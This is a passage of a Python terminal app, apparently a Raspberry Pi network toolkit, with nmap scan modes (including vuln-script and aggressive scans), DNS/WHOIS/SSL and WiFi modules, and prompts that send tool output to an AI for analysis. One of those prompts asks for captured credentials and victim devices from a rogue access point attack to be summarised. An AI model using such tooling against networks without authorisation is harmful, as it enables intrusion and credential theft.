- Potential indicators of compromise
Flag anything suspicious.""",

    "tab-tools": """Analyze this network tools output:
- Explain the results in plain terms
- Note any misconfigurations
- Identify network issues
- Suggest fixes if applicable
Be concise.""",

    "tab-geo": """Analyze this IP geolocation data:
- Summarize the location info
- Note if the location seems suspicious for the context
- Identify ISP/hosting provider implications
- Flag any privacy concerns
Keep it brief.""",

    "tab-http": """Analyze this HTTP request/response data:
- Identify security headers present or missing
- Note any information disclosure
- Flag potential vulnerabilities
- Explain redirect chains if present
Focus on security implications.""",

    "tab-security": """Analyze these security check results:
- Prioritize findings by severity
- Explain the implications of missing headers
- Note email security (SPF/DKIM/DMARC) gaps
- Suggest remediation steps
Be actionable and concise.""",

    "tab-bluetooth": """Analyze this Bluetooth scan data:
- Identify device types
- Note any devices in discoverable mode that shouldn't be
- Flag potential security concerns
- Summarize what's in range
Keep it brief.""",

    "tab-packets": """Analyze this packet capture data:
- Identify protocols and traffic patterns
- Flag suspicious packets or payloads
- Note any cleartext credentials or sensitive data
- Identify potential attacks (scanning, flooding, etc.)
Highlight security-relevant findings.""",

    "tab-rogueap": """Analyze this rogue AP/attack data:
- Summarize captured credentials or data
- Identify victim devices
- Note attack effectiveness
- Suggest defensive measures
Be concise and security-focused.""",

    "tab-vuln": """Analyze these vulnerability scan results:
- Prioritize vulnerabilities by severity
- Explain the risk of each finding
- Note which CVEs are actively exploited
- Suggest remediation order
Be actionable.""",
}

# AI Configuration - persisted to file
AI_CONFIG_FILE = Path.home() / ".config" / "netrunner" / "ai_config.json"

# Recommended models for Pi 5 (8GB)
OLLAMA_MODELS = {
    "phi3:mini": {"size": "2.2GB", "ram": "3-4GB", "desc": "Fast, good for analysis"},
    "llama3.2:3b": {"size": "2.0GB", "ram": "3-4GB", "desc": "Meta's latest small model"},
    "gemma2:2b": {"size": "1.6GB", "ram": "2-3GB", "desc": "Google's efficient model"},
    "qwen2.5:3b": {"size": "1.9GB", "ram": "3GB", "desc": "Alibaba's multilingual"},
    "tinyllama": {"size": "637MB", "ram": "1-2GB", "desc": "Tiny but capable"},
}

def load_ai_config() -> dict:
    """Load AI configuration from file."""
    default = {"provider": "ollama", "model": "phi3:mini"}
    try:
        AI_CONFIG_FILE.parent.mkdir(parents=True, exist_ok=True)
        if AI_CONFIG_FILE.exists():
            with open(AI_CONFIG_FILE) as f:
                return {**default, **json.load(f)}
    except Exception:
        pass
    return default

def save_ai_config(config: dict) -> None:
    """Save AI configuration to file."""
    try:
        AI_CONFIG_FILE.parent.mkdir(parents=True, exist_ok=True)
        with open(AI_CONFIG_FILE, "w") as f:
            json.dump(config, f, indent=2)
    except Exception:
        pass

def get_installed_models() -> list:
    """Get list of installed Ollama models."""
    try:
        result = subprocess.run(
            ["ollama", "list"],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0:
            lines = result.stdout.strip().split("\n")[1:]  # Skip header
            return [line.split()[0] for line in lines if line.strip()]
    except Exception:
        pass
    return []


class AISettingsScreen(ModalScreen):
    """Modal screen for AI provider/model settings."""

    BINDINGS = [
        Binding("escape", "dismiss", "Close"),
        Binding("q", "dismiss", "Close"),
        Binding("1", "select_ollama", "Ollama"),
        Binding("2", "select_claude", "Claude"),
        Binding("tab", "focus_next", "Next"),
    ]

    def __init__(self):
        super().__init__()
        self._config = load_ai_config()
        self._installed = get_installed_models()
        self._pulling = False
        self._provider = self._config.get("provider", "ollama")

    def compose(self) -> ComposeResult:
        # Build model options from installed + recommended
        model_options = []

        # First add installed models
        for model in self._installed:
            info = OLLAMA_MODELS.get(model, {"desc": "Installed"})
            model_options.append((f"✓ {model} - {info.get('desc', 'Installed')}", model))

        # Then add recommended models that aren't installed
        for model, info in OLLAMA_MODELS.items():
            if model not in self._installed:
                model_options.append((f"{model} [{info['size']}] - {info['desc']}", model))

        # Ensure we always have at least one option
        if not model_options:
            model_options = [("phi3:mini [2.2GB] - Fast, good for analysis", "phi3:mini")]

        # Get current model, default to first available
        current_model = self._config.get("model", "phi3:mini")
        if not any(m[1] == current_model for m in model_options):
            current_model = model_options[0][1]

        yield Vertical(
            Static("[bold cyan]AI SETTINGS[/bold cyan] [muted]Esc/q to close[/muted]", id="ai-settings-header"),
            Static("[bold]Provider:[/bold] Press [yellow]1[/yellow]=Ollama  [yellow]2[/yellow]=Claude", id="ai-provider-label"),
            Static(self._get_provider_display(), id="ai-provider-status"),
            Static(""),
            Static("[bold]Model:[/bold] (for Ollama)", id="ai-model-label"),
            Select(model_options, id="ai-model", value=current_model),
            Static("", id="ai-model-status"),
            Horizontal(
                Button("Save", id="btn-ai-save", variant="primary"),
                Button("Pull Model", id="btn-ai-pull", variant="warning"),
                Button("Cancel", id="btn-ai-cancel"),
                classes="ai-buttons",
            ),
            Static("[dim]Ollama: offline, ~2-5 tok/s on Pi 5[/dim]", id="ai-hint1"),
            Static("[dim]Claude: online, faster, requires internet[/dim]", id="ai-hint2"),
            id="ai-settings-container",
            classes="help-overlay",
        )

    def _get_provider_display(self) -> str:
        if self._provider == "claude":
            return "[green]► Claude CLI (online)[/green]  [dim]Ollama (offline)[/dim]"
        else:
            return "[green]► Ollama (offline)[/green]  [dim]Claude CLI (online)[/dim]"

    def action_select_ollama(self) -> None:
        self._provider = "ollama"
        self.query_one("#ai-provider-status", Static).update(self._get_provider_display())
        self.query_one("#ai-model", Select).disabled = False
        self._update_model_status()

    def action_select_claude(self) -> None:
        self._provider = "claude"
        self.query_one("#ai-provider-status", Static).update(self._get_provider_display())
        self.query_one("#ai-model", Select).disabled = True
        self.query_one("#ai-model-status", Static).update("[cyan]Claude uses Sonnet model[/cyan]")

    def on_mount(self) -> None:
        self._update_model_status()
        # If Claude is selected, disable model dropdown
        if self._provider == "claude":
            self.query_one("#ai-model", Select).disabled = True
            self.query_one("#ai-model-status", Static).update("[cyan]Claude uses Sonnet model[/cyan]")

    @on(Select.Changed, "#ai-model")
    def on_model_change(self, event: Select.Changed) -> None:
        self._update_model_status()

    def _update_model_status(self) -> None:
        model = self.query_one("#ai-model", Select).value
        status = self.query_one("#ai-model-status", Static)
        if model in self._installed:
            status.update(f"[green]✓ {model} is installed[/green]")
        else:
            info = OLLAMA_MODELS.get(model, {})
            size = info.get("size", "?")
            status.update(f"[yellow]⚠ {model} not installed ({size})[/yellow]")

    @on(Button.Pressed, "#btn-ai-save")
    def save_settings(self) -> None:
        model = self.query_one("#ai-model", Select).value
        save_ai_config({"provider": self._provider, "model": model})
        if self._provider == "claude":
            self.app.notify("AI: Claude CLI (Sonnet)", timeout=2)
        else:
            self.app.notify(f"AI: Ollama/{model}", timeout=2)
        self.dismiss()

    @on(Button.Pressed, "#btn-ai-cancel")
    def cancel_settings(self) -> None:
        self.dismiss()

    @on(Button.Pressed, "#btn-ai-pull")
    def pull_model(self) -> None:
        if self._pulling:
            return
        model = self.query_one("#ai-model", Select).value
        if model in self._installed:
            self.app.notify(f"{model} already installed", timeout=2)
            return
        self._pulling = True
        self.query_one("#ai-model-status", Static).update(f"[cyan]Pulling {model}...[/cyan]")
        self._do_pull(model)

    @work(exclusive=True)
    async def _do_pull(self, model: str) -> None:
        status = self.query_one("#ai-model-status", Static)
        try:
            proc = await asyncio.create_subprocess_exec(
                "ollama", "pull", model,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
            )
            async for line in proc.stdout:
                text = line.decode().strip()
                if "pulling" in text.lower() or "%" in text:
                    # Extract progress
                    status.update(f"[cyan]{text[:50]}[/cyan]")
            await proc.wait()
            if proc.returncode == 0:
                self._installed = get_installed_models()
                status.update(f"[green]✓ {model} installed![/green]")
                self.app.notify(f"{model} ready", timeout=2)
            else:
                status.update(f"[red]Failed to pull {model}[/red]")
        except Exception as e:
            status.update(f"[red]Error: {e}[/red]")
        finally:
            self._pulling = False


class AIAnalysisScreen(ModalScreen):
    """Modal screen to show AI analysis results."""

    BINDINGS = [
        Binding("escape", "dismiss", "Close"),
        Binding("q", "dismiss", "Close"),
    ]

    def __init__(self, analysis: str = "", loading: bool = True):
        super().__init__()
        self._analysis = analysis
        self._loading = loading

    def compose(self) -> ComposeResult:
        yield Vertical(
            Static("[bold cyan]AI ANALYSIS[/bold cyan] [muted]Esc to close[/muted]", id="ai-header"),
            LoadingIndicator(id="ai-loading") if self._loading else Static(""),
            VerticalScroll(
                Static(self._analysis or "[dim]Analyzing...[/dim]", id="ai-content"),
            ),
            id="ai-container",
            classes="help-overlay",
        )

    def update_analysis(self, text: str) -> None:
        """Update the analysis content."""
        try:
            self.query_one("#ai-loading", LoadingIndicator).remove()
        except Exception:
            pass
        self.query_one("#ai-content", Static).update(text)


class HelpScreen(ModalScreen):
    """Paginated help screen for better performance."""

    BINDINGS = [
        Binding("escape", "dismiss", "Close"),
        Binding("question_mark", "dismiss", "Close"),
        Binding("left", "prev_page", "Prev"),
        Binding("right", "next_page", "Next"),
    ]

    PAGE_ORDER = ["keys", "scanner", "dns", "wifi", "ping", "speed",
                  "monitor", "tools", "geo", "http", "security",
                  "bluetooth", "packets", "rogueap", "vuln", "ai"]

    def compose(self) -> ComposeResult:
        yield Vertical(
            Static("[bold cyan]NETRUNNER HELP[/bold cyan] [muted]← → to navigate | Esc to close[/muted]", id="help-header"),
            Select([
                ("Keybindings & Quick Ref", "keys"),
                ("[1] Scanner", "scanner"),
                ("[2] DNS/SSL", "dns"),
                ("[3] WiFi", "wifi"),
                ("[4] Ping", "ping"),
                ("[5] Speed", "speed"),
                ("[6] Monitor", "monitor"),
                ("[7] Tools", "tools"),
                ("[8] Geo", "geo"),
                ("[9] HTTP", "http"),
                ("[0] Security", "security"),
                ("[-] Bluetooth", "bluetooth"),
                ("[=] Packets", "packets"),
                ("[\\] RogueAP", "rogueap"),
                ("[`] Vuln", "vuln"),
                ("[a/A] AI Analysis", "ai"),
            ], id="help-select", value="keys"),
            Static(HELP_PAGES["keys"], id="help-content"),
            id="help-container",
            classes="help-overlay",
        )

    @on(Select.Changed, "#help-select")
    def on_page_select(self, event: Select.Changed) -> None:
        page = event.value
        if page in HELP_PAGES:
            self.query_one("#help-content", Static).update(HELP_PAGES[page])

    def action_prev_page(self) -> None:
        select = self.query_one("#help-select", Select)
        current = select.value
        if current in self.PAGE_ORDER:
            idx = self.PAGE_ORDER.index(current)
            new_idx = (idx - 1) % len(self.PAGE_ORDER)
            select.value = self.PAGE_ORDER[new_idx]
            self.query_one("#help-content", Static).update(HELP_PAGES[self.PAGE_ORDER[new_idx]])

    def action_next_page(self) -> None:
        select = self.query_one("#help-select", Select)
        current = select.value
        if current in self.PAGE_ORDER:
            idx = self.PAGE_ORDER.index(current)
            new_idx = (idx + 1) % len(self.PAGE_ORDER)
            select.value = self.PAGE_ORDER[new_idx]
            self.query_one("#help-content", Static).update(HELP_PAGES[self.PAGE_ORDER[new_idx]])


class ScannerModule(Container):
    """Network scanning module with ARP and MAC lookup."""

    def compose(self) -> ComposeResult:
        yield Horizontal(
            Vertical(
                Input(placeholder="Target IP/CIDR", id="scan-target"),
                Input(placeholder="Ports (opt)", id="scan-ports"),
                Select([
                    ("Ping Sweep", "ping"),
                    ("ARP Scan", "arp"),
                    ("TCP Top 100", "ports"),
                    ("UDP Top 20", "udp"),
                    ("Services", "services"),
                ], id="scan-type", value="ping"),
                Button("Scan", id="btn-scan", variant="primary"),
                Button("Local", id="btn-scan-local"),
                Button("Clear", id="btn-scan-clear", variant="error"),
                Static("", id="scan-status"),
                classes="sidebar",
            ),
            WrappingRichLog(id="scan-results", highlight=True, markup=True, wrap=True, classes="main-output"),
            classes="module-layout",
        )

    @on(Button.Pressed, "#btn-scan")
    def do_scan(self) -> None:
        target = self.query_one("#scan-target", Input).value.strip()
        if not target:
            self.query_one("#scan-status", Static).update("[red]Please enter a target[/red]")
            return
        scan_type = self.query_one("#scan-type", Select).value
        custom_ports = self.query_one("#scan-ports", Input).value.strip()
        if scan_type == "arp":
            self.run_arp_scan(target)
        else:
            self.run_scan(target, scan_type, custom_ports)

    @on(Button.Pressed, "#btn-scan-local")
    def scan_local(self) -> None:
        target = get_network_cidr()
        self.query_one("#scan-target", Input).value = target
        self.run_arp_scan(target)

    @on(Button.Pressed, "#btn-mac-lookup")
    def mac_lookup(self) -> None:
        target = self.query_one("#scan-target", Input).value.strip()
        log = self.query_one("#scan-results", RichLog)
        if not target:
            self.query_one("#scan-status", Static).update("[red]Enter a MAC address[/red]")
            return
        vendor = lookup_mac_vendor(target)
        log.write(f"[cyan]MAC Address:[/cyan] {target}")
        log.write(f"[green]Vendor:[/green] {vendor}")

    @on(Button.Pressed, "#btn-scan-clear")
    def clear_results(self) -> None:
        self.query_one("#scan-results", RichLog).clear()
        self.query_one("#scan-status", Static).update("")

    @work(exclusive=True)
    async def run_arp_scan(self, target: str) -> None:
        """Fast ARP scan using arp-scan or nmap."""
        log = self.query_one("#scan-results", RichLog)
        status = self.query_one("#scan-status", Static)

        status.update("[cyan]Running ARP scan...[/cyan]")
        log.write(f"[cyan]> ARP scan {target}[/cyan]\n")

        try:
            # Try arp-scan first, fall back to nmap
            proc = await asyncio.create_subprocess_exec(
                "sudo", "nmap", "-sn", "-PR", target,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            async for line in proc.stdout:
                text = line.decode().rstrip()
                if "Nmap scan report" in text:
                    log.write(f"[cyan]{text}[/cyan]")
                elif "MAC Address" in text:
                    # Extract and lookup vendor
                    match = re.search(r'([0-9A-F:]{17})', text, re.I)
                    if match:
                        mac = match.group(1)
                        vendor = lookup_mac_vendor(mac)
                        log.write(f"[green]{text} ({vendor})[/green]")
                    else:
                        log.write(f"[green]{text}[/green]")
                elif "Host is up" in text:
                    log.write(f"[yellow]{text}[/yellow]")
                else:
                    log.write(text)

            await proc.wait()
            status.update("[green]ARP scan complete[/green]")
            if hasattr(self.app, 'sound_enabled') and self.app.sound_enabled:
                play_beep(1500, 50)

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Scan failed[/red]")

    @work(exclusive=True)
    async def run_scan(self, target: str, scan_type: str, custom_ports: str = "") -> None:
        log = self.query_one("#scan-results", RichLog)
        status = self.query_one("#scan-status", Static)

        cmd = ["nmap"]
        port_arg = f"-p {custom_ports}" if custom_ports else ""

        if scan_type == "ping":
            cmd.extend(["-sn", target])
            status.update("[cyan]Running ping scan...[/cyan]")
        elif scan_type == "ports":
            if custom_ports:
                cmd.extend(["-sT", "-p", custom_ports, target])
                status.update(f"[cyan]Scanning ports {custom_ports}...[/cyan]")
            else:
                cmd.extend(["-sT", "--top-ports", "100", target])
                status.update("[cyan]Scanning top 100 TCP ports...[/cyan]")
        elif scan_type == "full":
            cmd.extend(["-sT", "-p-", target])
            status.update("[cyan]Full TCP port scan (65535 ports)...[/cyan]")
        elif scan_type == "udp":
            if custom_ports:
                cmd = ["sudo", "nmap", "-sU", "-p", custom_ports, target]
            else:
                cmd = ["sudo", "nmap", "-sU", "--top-ports", "20", target]
            status.update("[cyan]UDP port scan (sudo required)...[/cyan]")
        elif scan_type == "services":
            if custom_ports:
                cmd.extend(["-sV", "-p", custom_ports, target])
            else:
                cmd.extend(["-sV", "--top-ports", "100", target])
            status.update("[cyan]Detecting services...[/cyan]")
        elif scan_type == "os":
            cmd = ["sudo", "nmap", "-O", target]
            status.update("[cyan]OS detection (sudo)...[/cyan]")
        elif scan_type == "vuln":
            if custom_ports:
                cmd = ["sudo", "nmap", "--script=vuln", "-p", custom_ports, target]
            else:
                cmd = ["sudo", "nmap", "--script=vuln", "--top-ports", "100", target]
            status.update("[cyan]Vulnerability scan (sudo)...[/cyan]")
        elif scan_type == "aggressive":
            if custom_ports:
                cmd = ["sudo", "nmap", "-A", "-p", custom_ports, target]
            else:
                cmd = ["sudo", "nmap", "-A", "--top-ports", "100", target]
            status.update("[cyan]Aggressive scan (sudo)...[/cyan]")

        log.write(f"[cyan]> {' '.join(cmd)}[/cyan]\n")

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            async for line in proc.stdout:
                text = line.decode().rstrip()
                if "open" in text.lower():
                    log.write(f"[green]{text}[/green]")
                    if hasattr(self.app, 'sound_enabled') and self.app.sound_enabled:
                        play_beep(800, 30)
                elif "closed" in text.lower() or "filtered" in text.lower():
                    log.write(f"[yellow]{text}[/yellow]")
                elif "Host is up" in text or "Nmap scan report" in text:
                    log.write(f"[cyan]{text}[/cyan]")
                elif "MAC Address" in text:
                    match = re.search(r'([0-9A-F:]{17})', text, re.I)
                    if match:
                        vendor = lookup_mac_vendor(match.group(1))
                        log.write(f"[green]{text} ({vendor})[/green]")
                    else:
                        log.write(f"[green]{text}[/green]")
                else:
                    log.write(text)

            await proc.wait()
            status.update("[green]Scan complete[/green]")
            if hasattr(self.app, 'sound_enabled') and self.app.sound_enabled:
                play_beep(1500, 100)

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Scan failed[/red]")


class DNSModule(Container):
    """DNS, WHOIS, and SSL/TLS checker module."""

    def compose(self) -> ComposeResult:
        yield Horizontal(
            Vertical(
                Input(placeholder="domain/IP", id="dns-target"),
                Select([
                    ("A", "A"),
                    ("MX", "MX"),
                    ("NS", "NS"),
                    ("TXT", "TXT"),
                ], id="dns-type", value="A"),
                Button("Lookup", id="btn-dns", variant="primary"),
                Button("WHOIS", id="btn-whois"),
                Button("SSL", id="btn-ssl"),
                Button("Clear", id="btn-dns-clear", variant="error"),
                Static("", id="dns-status"),
                classes="sidebar",
            ),
            WrappingRichLog(id="dns-results", highlight=True, markup=True, wrap=True, classes="main-output"),
            classes="module-layout",
        )

    @on(Button.Pressed, "#btn-dns")
    def do_dns(self) -> None:
        target = self.query_one("#dns-target", Input).value.strip()
        if not target:
            self.query_one("#dns-status", Static).update("[red]Please enter a domain or IP[/red]")
            return
        query_type = self.query_one("#dns-type", Select).value
        if query_type == "WHOIS":
            self.run_whois(target)
        elif query_type == "SSL":
            self.run_ssl_check(target)
        else:
            self.run_dns(target, query_type)

    @on(Button.Pressed, "#btn-whois")
    def do_whois(self) -> None:
        target = self.query_one("#dns-target", Input).value.strip()
        if target:
            self.run_whois(target)

    @on(Button.Pressed, "#btn-ssl")
    def do_ssl(self) -> None:
        target = self.query_one("#dns-target", Input).value.strip()
        if target:
            self.run_ssl_check(target)

    @on(Button.Pressed, "#btn-dns-clear")
    def clear_results(self) -> None:
        self.query_one("#dns-results", RichLog).clear()
        self.query_one("#dns-status", Static).update("")

    @work(exclusive=True)
    async def run_dns(self, target: str, query_type: str) -> None:
        log = self.query_one("#dns-results", RichLog)
        status = self.query_one("#dns-status", Static)

        status.update(f"[cyan]Querying {query_type} records...[/cyan]")
        log.write(f"[cyan]> dig {target} {query_type}[/cyan]\n")

        try:
            proc = await asyncio.create_subprocess_exec(
                "dig", "+noall", "+answer", "+authority", target, query_type,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            if stdout:
                for line in stdout.decode().strip().split('\n'):
                    if line:
                        if query_type in line:
                            log.write(f"[green]{line}[/green]")
                        else:
                            log.write(line)
            else:
                log.write("[yellow]No records found[/yellow]")

            status.update("[green]Lookup complete[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Lookup failed[/red]")

    @work(exclusive=True)
    async def run_whois(self, target: str) -> None:
        log = self.query_one("#dns-results", RichLog)
        status = self.query_one("#dns-status", Static)

        status.update(f"[cyan]WHOIS lookup for {target}...[/cyan]")
        log.write(f"[cyan]> whois {target}[/cyan]\n")

        try:
            proc = await asyncio.create_subprocess_exec(
                "whois", target,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            if stdout:
                for line in stdout.decode().strip().split('\n'):
                    if ':' in line:
                        key, _, value = line.partition(':')
                        key_lower = key.lower()
                        if any(k in key_lower for k in ['registr', 'name', 'organization', 'email', 'date', 'server']):
                            log.write(f"[cyan]{key}:[/cyan]{value}")
                        else:
                            log.write(line)
                    else:
                        log.write(line)

            status.update("[green]WHOIS complete[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]WHOIS failed[/red]")

    @work(exclusive=True)
    async def run_ssl_check(self, target: str) -> None:
        """Check SSL/TLS certificate information."""
        log = self.query_one("#dns-results", RichLog)
        status = self.query_one("#dns-status", Static)

        # Remove protocol prefix if present
        target = target.replace("https://", "").replace("http://", "").split("/")[0]

        status.update(f"[cyan]Checking SSL/TLS for {target}...[/cyan]")
        log.write(f"[cyan]> SSL/TLS check: {target}[/cyan]\n")

        try:
            context = ssl.create_default_context()

            # Run in executor to avoid blocking
            loop = asyncio.get_event_loop()

            def get_cert():
                with socket.create_connection((target, 443), timeout=10) as sock:
                    with context.wrap_socket(sock, server_hostname=target) as ssock:
                        cert = ssock.getpeercert()
                        cipher = ssock.cipher()
                        version = ssock.version()
                        return cert, cipher, version

            cert, cipher, version = await loop.run_in_executor(None, get_cert)

            # Parse certificate
            log.write(f"[bold cyan]Certificate Information[/bold cyan]")
            log.write(f"[green]TLS Version:[/green] {version}")
            log.write(f"[green]Cipher Suite:[/green] {cipher[0]}")
            log.write(f"[green]Key Size:[/green] {cipher[2]} bits")

            # Subject
            subject = dict(x[0] for x in cert.get('subject', []))
            log.write(f"\n[bold cyan]Subject[/bold cyan]")
            log.write(f"[green]Common Name:[/green] {subject.get('commonName', 'N/A')}")
            log.write(f"[green]Organization:[/green] {subject.get('organizationName', 'N/A')}")

            # Issuer
            issuer = dict(x[0] for x in cert.get('issuer', []))
            log.write(f"\n[bold cyan]Issuer[/bold cyan]")
            log.write(f"[green]Common Name:[/green] {issuer.get('commonName', 'N/A')}")
            log.write(f"[green]Organization:[/green] {issuer.get('organizationName', 'N/A')}")

            # Validity
            log.write(f"\n[bold cyan]Validity[/bold cyan]")
            not_before = cert.get('notBefore', 'N/A')
            not_after = cert.get('notAfter', 'N/A')
            log.write(f"[green]Not Before:[/green] {not_before}")
            log.write(f"[green]Not After:[/green] {not_after}")

            # Check expiry
            try:
                from datetime import datetime
                expiry = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
                days_left = (expiry - datetime.now()).days
                if days_left < 0:
                    log.write(f"[red]EXPIRED {abs(days_left)} days ago![/red]")
                elif days_left < 30:
                    log.write(f"[yellow]Expires in {days_left} days[/yellow]")
                else:
                    log.write(f"[green]Expires in {days_left} days[/green]")
            except Exception:
                pass

            # SANs
            san = cert.get('subjectAltName', [])
            if san:
                log.write(f"\n[bold cyan]Subject Alt Names[/bold cyan]")
                for type_, value in san[:5]:  # Limit to 5
                    log.write(f"[green]{type_}:[/green] {value}")
                if len(san) > 5:
                    log.write(f"[gray]... and {len(san) - 5} more[/gray]")

            status.update("[green]SSL check complete[/green]")

        except ssl.SSLCertVerificationError as e:
            log.write(f"[red]Certificate verification failed![/red]")
            log.write(f"[red]{e}[/red]")
            status.update("[red]SSL verification failed[/red]")
        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]SSL check failed[/red]")


class WiFiModule(Container):
    """WiFi analyzer with bandwidth monitoring."""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._bandwidth_data = []
        self._monitoring = False

    def compose(self) -> ComposeResult:
        yield Horizontal(
            Vertical(
                Button("Scan", id="btn-wifi-scan", variant="primary"),
                Button("Info", id="btn-wifi-info"),
                Button("BW Mon", id="btn-bandwidth"),
                Button("Channels", id="btn-wifi-channels"),
                Button("Signal", id="btn-wifi-signal"),
                Button("Hidden", id="btn-wifi-hidden"),
                Button("Clear", id="btn-wifi-clear", variant="error"),
                Static("", id="wifi-status"),
                Sparkline([], id="bandwidth-spark", summary_function=max),
                classes="sidebar",
            ),
            WrappingRichLog(id="wifi-results", highlight=True, markup=True, wrap=True, classes="main-output"),
            classes="module-layout",
        )

    @on(Button.Pressed, "#btn-wifi-scan")
    def scan_networks(self) -> None:
        self._monitoring = False
        self.run_wifi_scan()

    @on(Button.Pressed, "#btn-wifi-info")
    def show_info(self) -> None:
        self._monitoring = False
        self.run_wifi_info()

    @on(Button.Pressed, "#btn-bandwidth")
    def toggle_bandwidth(self) -> None:
        if self._monitoring:
            self._monitoring = False
            self.query_one("#wifi-status", Static).update("[yellow]Monitoring stopped[/yellow]")
        else:
            self._monitoring = True
            self.run_bandwidth_monitor()

    @on(Button.Pressed, "#btn-wifi-clear")
    def clear_results(self) -> None:
        self._monitoring = False
        self.query_one("#wifi-results", RichLog).clear()
        self.query_one("#wifi-status", Static).update("")
        self._bandwidth_data = []
        self.query_one("#bandwidth-spark", Sparkline).data = []

    @on(Button.Pressed, "#btn-wifi-channels")
    def analyze_channels(self) -> None:
        self._monitoring = False
        self.run_channel_analysis()

    @on(Button.Pressed, "#btn-wifi-signal")
    def show_signal(self) -> None:
        self._monitoring = False
        self.run_signal_monitor()

    @on(Button.Pressed, "#btn-wifi-hidden")
    def scan_hidden(self) -> None:
        self._monitoring = False
        self.run_hidden_scan()

    @work(exclusive=True)
    async def run_wifi_scan(self) -> None:
        log = self.query_one("#wifi-results", RichLog)
        status = self.query_one("#wifi-status", Static)

        status.update("[cyan]Scanning for WiFi networks...[/cyan]")
        log.write("[cyan]> nmcli device wifi list[/cyan]\n")

        try:
            proc = await asyncio.create_subprocess_exec(
                "nmcli", "-t", "-f", "SSID,SIGNAL,SECURITY,CHAN,FREQ", "device", "wifi", "list",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            if stdout:
                log.write(f"{'SSID':<25} {'Signal':<8} {'Security':<15} {'Ch':<5} {'Freq':<10}")
                log.write("-" * 65)

                for line in stdout.decode().strip().split('\n'):
                    if line:
                        parts = line.split(':')
                        if len(parts) >= 5:
                            ssid, signal, security, chan, freq = parts[0], parts[1], parts[2], parts[3], parts[4]
                            signal_int = int(signal) if signal.isdigit() else 0
                            if signal_int >= 70:
                                color = "green"
                            elif signal_int >= 40:
                                color = "yellow"
                            else:
                                color = "red"
                            log.write(f"[{color}]{ssid:<25} {signal:>5}%   {security:<15} {chan:<5} {freq:<10}[/{color}]")

            status.update("[green]Scan complete[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Scan failed[/red]")

    @work(exclusive=True)
    async def run_wifi_info(self) -> None:
        log = self.query_one("#wifi-results", RichLog)
        status = self.query_one("#wifi-status", Static)

        status.update("[cyan]Getting connection info...[/cyan]")

        try:
            log.write("[cyan]Current Connection:[/cyan]")
            proc = await asyncio.create_subprocess_exec(
                "nmcli", "-t", "-f", "NAME,TYPE,DEVICE", "connection", "show", "--active",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            for line in stdout.decode().strip().split('\n'):
                if line:
                    parts = line.split(':')
                    if len(parts) >= 3:
                        log.write(f"  [green]{parts[0]}[/green] ({parts[1]}) on {parts[2]}")

            log.write("\n[cyan]Network Configuration:[/cyan]")
            log.write(f"  Local IP:  [green]{get_local_ip()}[/green]")
            log.write(f"  Gateway:   [green]{get_default_gateway()}[/green]")

            proc = await asyncio.create_subprocess_exec(
                "nmcli", "-t", "-f", "IP4.DNS", "device", "show",
                stdout=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            dns_servers = [line.split(':')[1] for line in stdout.decode().strip().split('\n') if ':' in line and line.split(':')[1]]
            if dns_servers:
                log.write(f"  DNS:       [green]{', '.join(set(dns_servers))}[/green]")

            status.update("[green]Info retrieved[/green]")

        except Exception as e:
            log.write(f"[red]Error: {e}[/red]")
            status.update("[red]Failed[/red]")

    @work(exclusive=True)
    async def run_bandwidth_monitor(self) -> None:
        """Monitor bandwidth in real-time."""
        log = self.query_one("#wifi-results", RichLog)
        status = self.query_one("#wifi-status", Static)
        spark = self.query_one("#bandwidth-spark", Sparkline)

        log.clear()
        log.write("[cyan]Bandwidth Monitor (updates every second)[/cyan]\n")
        status.update("[cyan]Monitoring bandwidth...[/cyan]")

        prev_rx, prev_tx = 0, 0
        self._bandwidth_data = []

        while self._monitoring:
            try:
                with open("/proc/net/dev") as f:
                    lines = f.readlines()[2:]

                total_rx, total_tx = 0, 0
                for line in lines:
                    parts = line.split()
                    if len(parts) >= 10 and not parts[0].startswith("lo"):
                        total_rx += int(parts[1])
                        total_tx += int(parts[9])

                if prev_rx > 0:
                    rx_rate = (total_rx - prev_rx) / 1024  # KB/s
                    tx_rate = (total_tx - prev_tx) / 1024

                    self._bandwidth_data.append(rx_rate + tx_rate)
                    if len(self._bandwidth_data) > 60:
                        self._bandwidth_data.pop(0)

                    spark.data = self._bandwidth_data

                    # Format rates
                    def fmt_rate(r):
                        if r > 1024:
                            return f"{r/1024:.1f} MB/s"
                        return f"{r:.1f} KB/s"

                    log.write(f"[green]RX: {fmt_rate(rx_rate):<12}[/green] [cyan]TX: {fmt_rate(tx_rate):<12}[/cyan]")

                prev_rx, prev_tx = total_rx, total_tx
                await asyncio.sleep(1)

            except Exception as e:
                log.write(f"[red]Error: {e}[/red]")
                break

        status.update("[yellow]Monitoring stopped[/yellow]")

    @work(exclusive=True)
    async def run_channel_analysis(self) -> None:
        """Analyze WiFi channel usage."""
        log = self.query_one("#wifi-results", RichLog)
        status = self.query_one("#wifi-status", Static)

        log.clear()
        status.update("[cyan]Analyzing WiFi channels...[/cyan]")
        log.write("[bold cyan]WiFi Channel Analysis[/bold cyan]\n")

        try:
            proc = await asyncio.create_subprocess_exec(
